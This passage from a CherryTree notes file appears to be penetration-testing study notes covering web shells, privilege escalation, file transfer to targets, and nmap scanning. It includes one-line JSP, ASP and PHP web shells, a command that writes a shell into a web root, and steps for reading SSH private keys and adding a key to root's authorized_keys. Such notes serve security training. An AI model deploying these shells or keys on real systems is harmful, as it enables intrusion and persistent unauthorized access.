	</rich_text>
        <rich_text underline="single">JSP:</rich_text>
        <rich_text>
		</rich_text>
        <rich_text family="monospace">&lt;% Runtime.getRuntime().exec(request.getParameter("cmd")); %&gt;
</rich_text>
        <rich_text>

	</rich_text>
        <rich_text underline="single">ASP:</rich_text>
        <rich_text>
		</rich_text>
        <rich_text family="monospace">&lt;% eval request("cmd") %&gt;</rich_text>
        <rich_text>




	</rich_text>
        <rich_text underline="single" weight="heavy">Uploading a web shell:</rich_text>
        <rich_text>

		We will need to place our web shell script in the remote hosts web directory in order to execute the script through the browser.
		
		</rich_text>
        <rich_text underline="single" style="italic">Default web roots for common web servers:</rich_text>
        <rich_text>
		
			</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text family="monospace" foreground="#ff7676">echo</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#c4f465">'&lt;?php system($_REQUEST["cmd"]); ?&gt;'</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">&gt;</rich_text>
        <rich_text family="monospace"> /var/www/html/shell.php</rich_text>
        <rich_text>

A great benefit to web shells is that they generally bypass any firewall that is in place. As it will not open a new connection on a port. It will run on port 80 or 443, or whatever port the web application is using.</rich_text>
        <table char_offset="3319" justification="left" col_min="60" col_max="60" col_widths="0,0">
          <row>
            <cell>Apache</cell>
            <cell>/var/www/html/</cell>
          </row>
          <row>
            <cell>Nginx</cell>
            <cell>/usr/local/nginx/html/</cell>
          </row>
          <row>
            <cell>IIS</cell>
            <cell>c:\inetpub\wwwroot\</cell>
          </row>
          <row>
            <cell>XAMPP</cell>
            <cell>C:\xampp\htdocs\</cell>
          </row>
          <row>
            <cell>Web Server</cell>
            <cell>Default Webroot</cell>
          </row>
        </table>
      </node>
      <node name="Privilege Escalation" unique_id="7" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1677657473" ts_lastsave="1677701775">
        <rich_text>
</rich_text>
        <rich_text underline="single" weight="heavy">Privilege Escalation Checklists:</rich_text>
        <rich_text>
	After initial access go through your various priv esc checklists to find any potential vulnerabilities to achieve higher privilege.
	
		* HackTricks 
		* Pentest Book
		* PayloadsAllTheThings
	
	
</rich_text>
        <rich_text underline="single" weight="heavy">Enumeration Scripts:</rich_text>
        <rich_text>
	Here are some common scripts to automatically enumerate the server. These scripts will run many commands and create a lot of noise.
	
		</rich_text>
        <rich_text underline="single">Linux:</rich_text>
        <rich_text>
			* LinEnum
			* LinPEAS
			* linuxprivchecker
		
		</rich_text>
        <rich_text underline="single">Windows:</rich_text>
        <rich_text>
			* Seatbelt
			* WinPEAS
			* JAWS
			

</rich_text>
        <rich_text underline="single" weight="heavy">Kernel Exploits</rich_text>
        <rich_text>:
	If a server is running an old operating system, search for vulnerabilities that may exist.
	

</rich_text>
        <rich_text underline="single" weight="heavy">Vulnerable Software:</rich_text>
        <rich_text>
	</rich_text>
        <rich_text underline="single">Search for vulnerable softare with:</rich_text>
        <rich_text>
		* dpkg -l
		* systemctl
		* top 
		* ps -aux
		
		
</rich_text>
        <rich_text weight="heavy">User Privileges:</rich_text>
        <rich_text>
	</rich_text>
        <rich_text underline="single">Common ways to exploit certain privileges:</rich_text>
        <rich_text>
		1.) sudo -l
		2.) sudo su -
		3.) sudo -u user /bin/echo Hello World!
		2.) SUID
		3.) Windows Token Privileges
		
	Once we find a application we can run with </rich_text>
        <rich_text weight="heavy">sudo</rich_text>
        <rich_text>, we can look for ways to exploit it and get a privileged shell.
	
		</rich_text>
        <rich_text underline="single">List of applications that can be used to escalate privileges:</rich_text>
        <rich_text>
			GTFOBins (Linux) - </rich_text>
        <rich_text link="webs https://gtfobins.github.io/">https://gtfobins.github.io/</rich_text>
        <rich_text>
			LOLBAS (Windows) - https://lolbas-project.github.io/
		
	
</rich_text>
        <rich_text underline="single" weight="heavy">Scheduled Tasks:</rich_text>
        <rich_text>
	
	</rich_text>
        <rich_text underline="single">Linux (Cron Jobs):</rich_text>
        <rich_text>
		1.) /etc/crontab
		2.) /etc/crond.
		3.) /var/spool/cron/crontabs/root
		
	Windows - Scheduled tasks:
	

</rich_text>
        <rich_text underline="single" weight="heavy">Exposed Credentials:</rich_text>
        <rich_text>
	This is very common with:
		1.) configuration files
		2.) log files
		3.) user history files </rich_text>
        <rich_text underline="single">.bash_history</rich_text>
        <rich_text> in Linux and </rich_text>
        <rich_text underline="single">PSReadLine</rich_text>
        <rich_text> in Windows.
	

</rich_text>
        <rich_text underline="single" weight="heavy">SSH Keys</rich_text>
        <rich_text>:
	If we have access to .ssh, we may read their private keys.
		1.) /home/user/.ssh/id_rsa
		2.) /root/.ssh/id_rsa
		
	Example:
		$ vim id_rsa
		$ chmod 600 id_rsa
		$ ssh user@10.10.10.121 -i id_rsa
	
	If we have write access to /.ssh/ we can place our public key in the users ssh directory at /home/user/.ssh/authorized_keys. We must first create a new key with ssh-keygen.
	This will give us two files, a private key and a public key. We will add the public key to the authorized_keys directory.	
	
	Example:
		$ ssh-keygen -f key
		$ echo “ssh-rsa AAAAB...SNIP...M= user@parot” &gt;&gt; /root.ssh/authorized_keys
		$ ssh root@10.10.10.121 -i key</rich_text>
      </node>
      <node name="Transferring Files" unique_id="8" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1677779696" ts_lastsave="1677781106">
        <rich_text>

</rich_text>
        <rich_text underline="single" weight="heavy">Using Wget:</rich_text>
        <rich_text>
	Run a python HTTP server on our machine and use wget or cURL to download the file on the targets machine.
		
		</rich_text>
        <rich_text underline="single">Our machine:</rich_text>
        <rich_text>
			$ cd /tmp
			$ python3 -m http.server 8080
		
		</rich_text>
        <rich_text underline="single">Target machine:</rich_text>
        <rich_text>
			$ wget </rich_text>
        <rich_text link="webs http://10.10.10.121:8080/linenum.sh">http://10.10.10.121:8080/linenum.sh</rich_text>
        <rich_text>
			or:
			$ curl </rich_text>
        <rich_text link="webs http://10.10.10.121:8080/linenum.sh">http://10.10.10.121:8080/linenum.sh</rich_text>
        <rich_text> -o linenum.sh
			

</rich_text>
        <rich_text underline="single" weight="heavy">Using SCP:</rich_text>
        <rich_text>
	If you have ssh user credentials for remote hosts you can transfer files with:
	
		$ scp linenum.sh user@remotehost:/tmp/linenum.sh
		

</rich_text>
        <rich_text underline="single" weight="heavy">Using Base64:</rich_text>
        <rich_text>
	In some cases, we may not be able to transfer the file. If the remote host has a firewall preventing us from downloading a file from our machine we can use a base64 trick to encode and decode the file.
	
	</rich_text>
        <rich_text underline="single">Base64 encode a file called “shell”:</rich_text>
        <rich_text>
		$ base64 shell -w 0
		
	</rich_text>
        <rich_text underline="single">Copy the base64 encoded string and decode on remote host:</rich_text>
        <rich_text>
		$ echo “f0VMIGRAAAAAAAAAAA.... &lt;Snip&gt; ..... lIuUdfnNJXSzsamdBUa” | base64 -d &gt; shell
		


</rich_text>
        <rich_text underline="single" weight="heavy">Validating File Transfers:</rich_text>
        <rich_text>
	
	</rich_text>
        <rich_text underline="single">Validate format of file:</rich_text>
        <rich_text>
		$ file shell
		
	</rich_text>
        <rich_text underline="single">Make sure we didn't mess up encoding / decoding process:</rich_text>
        <rich_text>
		
		The md5hash should be the same for both hosts.
		
		</rich_text>
        <rich_text underline="single">Local host:</rich_text>
        <rich_text>
		$ md5sum shell
		
		</rich_text>
        <rich_text underline="single">Remote host:</rich_text>
        <rich_text>
		$ md5sum shell</rich_text>
      </node>
    </node>
    <node name="Network Enumeration With Nmap" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1677817215" ts_lastsave="1677867887">
      <node name="Host Enumeration" unique_id="10" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1677817244" ts_lastsave="1677820314">
        <rich_text>
</rich_text>
        <rich_text underline="single" weight="heavy">Host Discovery</rich_text>
        <rich_text>:

	</rich_text>
        <rich_text underline="single">Scan network range:</rich_text>
        <rich_text>
		$ sudo nmap 10.10.2.0/24 -sn -oA tnet | grep for | cut -d “ ” -f5
		
		</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


	</rich_text>
        <rich_text underline="single">Disable arp ping:</rich_text>
        <rich_text>
		$ sudo nmap 10.10.2.23 -sn -oA host -PE --packet-trace --disable-arp-ping
		
		</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


</rich_text>
        <rich_text underline="single" weight="heavy">Host and Port Scanning:</rich_text>
        <rich_text>

	</rich_text>
        <rich_text justification="left" underline="single" foreground="#9eb3ca">There are a total of 6 different states for a scanned port we can obtain:</rich_text>
        <rich_text>
	
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


</rich_text>
        <rich_text underline="single" weight="heavy">Discovering Open TCP Ports:</rich_text>
        <rich_text>

	$ sudo nmap 10.10.10.3 --top-ports=10
	
	</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


</rich_text>
        <rich_text underline="single" weight="heavy">Discovering Open UDP Ports:</rich_text>
        <rich_text>

	$ sudo nmap 10.10.10.3 -F -sU 
	
	</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


</rich_text>
        <table char_offset="112" justification="left" col_min="60" col_max="60" col_widths="0,0">
          <row>
            <cell>10.129.2.0/24</cell>
            <cell>Target network range.</cell>
          </row>
          <row>
            <cell>-sn</cell>
            <cell>Disables port scanning.</cell>
          </row>
          <row>
            <cell>-oA tnet</cell>
            <cell>Stores the results in all formats starting with the name 'tnet'.</cell>
          </row>
          <row>
            <cell>Scanning Options</cell>
            <cell>Description                                                                                         </cell>
          </row>
        </table>
        <table char_offset="216" justification="left" col_min="60" col_max="60" col_widths="0,0">
          <row>
            <cell>10.129.2.18</cell>
            <cell>Performs defined scans against the target.</cell>
          </row>
          <row>
            <cell>-sn</cell>
            <cell>Disables port scanning.</cell>
          </row>
          <row>
            <cell>-oA host</cell>
            <cell>Stores the results in all formats starting with the name 'host'.</cell>
          </row>
          <row>
            <cell>-PE</cell>
            <cell>Performs the ping scan by using 'ICMP Echo requests' against the target.</cell>
          </row>
          <row>
            <cell>--reason</cell>
            <cell>Displays the reason for specific result.</cell>
          </row>
          <row>
            <cell>Scanning Options</cell>
            <cell>Description                                                                                                                     </cell>
          </row>
        </table>
        <table char_offset="322" justification="left" col_min="60" col_max="60" col_widths="0,0">
          <row>
            <cell>open</cell>
            <cell>This indicates that the connection to the scanned port has been established. These connections can be TCP connections, UDP datagrams as well as SCTP associations.</cell>
          </row>
          <row>
            <cell>closed</cell>
            <cell>When the port is shown as closed, the TCP protocol indicates that the packet we received back contains an RST flag. This scanning method can also be used to determine if our target is alive or not.</cell>
          </row>
          <row>
            <cell>filtered</cell>
            <cell>Nmap cannot correctly identify whether the scanned port is open or closed because either no response is returned from the target for the port or we get an error code from the target.</cell>
          </row>
          <row>
            <cell>unfiltered </cell>
            <cell>This state of a port only occurs during the TCP-ACK scan and means that the port is accessible, but it cannot be determined whether it is open or closed.</cell>
          </row>
          <row>
            <cell>open|filtered</cell>
            <cell>If we do not get a response for a specific port, Nmap will set it to that state. This indicates that a firewall or packet filter may protect the port.</cell>
          </row>
          <row>
            <cell>closed|filtered</cell>
            <cell>This state only occurs in the IP ID idle scans and indicates that it was impossible to determine if the scanned port is closed or filtered by a firewall.</cell>
          </row>
          <row>
            <cell>State                     </cell>
            <cell>Description                                                                                                                                           </cell>
          </row>
        </table>
        <table char_offset="397" justification="left" col_min="60" col_max="60" col_widths="0,0">
          <row>
            <cell>10.129.2.28</cell>
            <cell>Scans the specified target.</cell>
          </row>
          <row>
            <cell>--top-ports=10</cell>
            <cell>Scans the specified top ports that have been defined as most frequent.</cell>
          </row>
          <row>
            <cell>Scanning Options     </cell>
            <cell>Description                                                                                                            </cell>
          </row>
        </table>
        <table char_offset="465" justification="left" col_min="60" col_max="60" col_widths="0,0">
          <row>
            <cell>10.129.2.28</cell>
            <cell>Scans the specified target.</cell>
          </row>
          <row>
            <cell>-F</cell>
            <cell>Scans top 100 ports.</cell>
          </row>
          <row>
            <cell>-sU</cell>
            <cell>Performs a UDP scan.</cell>
          </row>
          <row>
            <cell>Scanning Options      </cell>
            <cell>Description                                                                                  </cell>
          </row>
        </table>
      </node>
      <node name="Saving The Results" unique_id="11" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1677820356" ts_lastsave="1677820531">
        <rich_text>
</rich_text>
        <rich_text underline="single" weight="heavy">Different Formats:</rich_text>
        <rich_text>

   ◇ Normal output (-oN) with the </rich_text>
        <rich_text underline="single">.nmap</rich_text>
        <rich_text> file extension
   ◇ Grepable output (-oG) with the </rich_text>
        <rich_text underline="single">.gnmap</rich_text>
        <rich_text> file extension
   ◇ XML output (-oX) with the </rich_text>
        <rich_text underline="single">.xml</rich_text>
        <rich_text> file extension



	$ sudo nmap 10.10.32.421 -p- -oA target
	
	</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <table char_offset="232" justification="left" col_min="60" col_max="60" col_widths="0,0">
          <row>
            <cell>10.129.2.28</cell>
            <cell>Scans the specified target.</cell>
          </row>
          <row>
            <cell>-p-</cell>
            <cell>Scans all ports.</cell>
          </row>
          <row>
            <cell>-oA target</cell>
            <cell>Saves the results in all formats, starting the name of each file with 'target'.</cell>
          </row>
          <row>
            <cell>Scanning Options</cell>
            <cell>Description                                                                                           </cell>
          </row>
        </table>
      </node>
      <node name="Service Enumeration" unique_id="12" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1677820823" ts_lastsave="1678044602">
        <rich_text>
When scanning a machine, or network, it's recommended to perform a small scan first. This uses less traffic which is advantageous for us because otherwise we can be blocked by security mechanisms if we're detected.

	</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
	</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
	
	
	
	
</rich_text>
        <table char_offset="218" justification="left" col_min="60" col_max="60" col_widths="0,0">
          <row>
            <cell>10.129.2.28</cell>
            <cell>Scans the specified target.</cell>
          </row>
          <row>
            <cell>-p-</cell>
            <cell>Scans all ports.</cell>
          </row>
          <row>
            <cell>-sV</cell>
            <cell>Performs service version detection on specified ports.</cell>
          </row>
          <row>
            <cell>-Pn</cell>
            <cell>Disables ICMP Echo requests.</cell>
          </row>
          <row>
            <cell>-n</cell>
            <cell>Disables DNS resolution.</cell>
          </row>
          <row>
            <cell>--disable-arp-ping</cell>
            <cell>Disables ARP ping.</cell>
          </row>
          <row>
            <cell>--packet-trace</cell>
            <cell>Shows all packets sent and received.</cell>
          </row>
          <row>
            <cell>Scanning Options</cell>
            <cell>Description                                                           </cell>
          </row>
        </table>
        <table char_offset="221" justification="left" col_min="60" col_max="60" col_widths="0,0">
          <row>
            <cell>--stats-every=5s</cell>
            <cell>Shows the progress of the scan every 5 seconds.</cell>
          </row>
        </table>
      </node>
      <node name="Nmap Scripting Engine" unique_id="13" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1677867887" ts_lastsave="1678044411">
        <rich_text>
Nmap Scripting Engine (NSE) allows us to create scripts in Lua for interaction with certain services.
There are a total of 14 categories into which these scripts can be divided:

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>



$ sudo nmap 10.129.2.28 -p --script banner, smtp-commands

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>



$ sudo nmap 10.129.2.28 -p 80 -sV --script vuln


</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text underline="single">Output from vuln scan:</rich_text>
        <rich_text>

</rich_text>
        <rich_text family="monospace">Nmap scan report for 10.129.2.28
Host is up (0.036s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-enum:
|   /wp-login.php: Possible admin folder
|   /readme.html: Wordpress version: 2
|   /: WordPress version: 5.3.4
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|_  /readme.html: Interesting, a readme.
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-wordpress-users:
| Username found: admin
</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">|_Search stopped at ID </rich_text>
        <rich_text family="monospace" foreground="#ff7676" weight="heavy">#</rich_text>
        <rich_text family="monospace" foreground="#ffb71a">25</rich_text>
        <rich_text family="monospace">. Increase the upper limit </rich_text>
        <rich_text family="monospace" foreground="#ff7676">if</rich_text>
        <rich_text family="monospace"> necessary with </rich_text>
        <rich_text family="monospace" foreground="#c4f465">'http-wordpress-users.limit'</rich_text>
        <rich_text family="monospace">
| vulners:
|   cpe:/a:apache:http_server:2.4.29:
|     	CVE-2019-0211	7.2	https://vulners.com/cve/CVE-2019-0211
|     	CVE-2018-1312	6.8	https://vulners.com/cve/CVE-2018-1312
|     	CVE-2017-15715	6.8	https://vulners.com/cve/CVE-2017-15715
&lt;SNIP&gt;</rich_text>
        <rich_text>



$ sudo nmap 10.10.23.121 -p80 --script http-enum
</rich_text>
        <table char_offset="180" justification="left" col_min="300" col_max="300" col_widths="0,0" is_light="1">
          <row>
            <cell>Auth</cell>
            <cell>Determine authentication credentials</cell>
          </row>
          <row>
            <cell>Broadcast</cell>
            <cell>Scripts which are used for host discovery by broadcasting and the discovered hosts can be automatically added to the existing scan</cell>
          </row>
          <row>
            <cell>Brute</cell>
            <cell>Execute scripts that try to login to the respective service by brute-forcing credentials</cell>
          </row>
          <row>
            <cell>Default</cell>
            <cell>Default scripts executed by using the "-sC" command</cell>
          </row>
          <row>
            <cell>Discovery</cell>
            <cell>Evaluation of accessible services.</cell>
          </row>
          <row>
            <cell>Dos</cell>
            <cell>Scripts to determine Denial of Service vulnerabilities... Used less as it is harmful to the service.</cell>
          </row>
          <row>
            <cell>Exploit</cell>
            <cell>Tries to exploit services with known vulnerabilities.</cell>
          </row>
          <row>
            <cell>External</cell>
            <cell>Scripts that use external services to perform.</cell>
          </row>
          <row>
            <cell>Fuzzer</cell>
            <cell>Sends variety of differnt fields for discovery </cell>
          </row>
          <row>
            <cell>Intrusive</cell>
            <cell>Intrusive scripts that could negatively effect the target system.</cell>
          </row>
          <row>
            <cell>Malware</cell>
            <cell>Check if some malware infects the target system</cell>
          </row>
          <row>
            <cell>Safe</cell>
            <cell>Defensive scripts that do not perform intrusive or destructiveness. </cell>
          </row>
          <row>
            <cell>Version</cell>
            <cell>Extension for version detection</cell>
          </row>
          <row>
            <cell>Vuln</cell>
            <cell>Indication of specific vulnerabilities</cell>
          </row>
          <row>
            <cell>Category</cell>
            <cell>Description</cell>
          </row>
        </table>
        <table char_offset="244" justification="left" col_min="300" col_max="300" col_widths="0,0">
          <row>
            <cell>10.129.2.28</cell>
            <cell>Scans the specified target.</cell>
          </row>
          <row>
            <cell>-p 25</cell>
            <cell>Scans only the specified port.</cell>
          </row>
          <row>
            <cell>--script banner,smtp-commands</cell>
            <cell>Uses specified NSE scripts.</cell>
          </row>
          <row>
            <cell>Scanning Options</cell>
            <cell>Description</cell>
          </row>
        </table>
        <table char_offset="299" justification="left" col_min="300" col_max="300" col_widths="0,0">
          <row>
            <cell>-p 80</cell>
            <cell>Scans only the specified port.</cell>
          </row>
          <row>
            <cell>-sV</cell>
            <cell>Performs service version detection on specified ports.</cell>
          </row>
          <row>
            <cell>--script vuln</cell>
            <cell>Uses all related scripts from specified category.</cell>
          </row>
          <row>
            <cell>10.129.2.28</cell>
            <cell>Scans the specified target.</cell>
          </row>
        </table>
      </node>
    </node>
  </node>
</cherrytree>
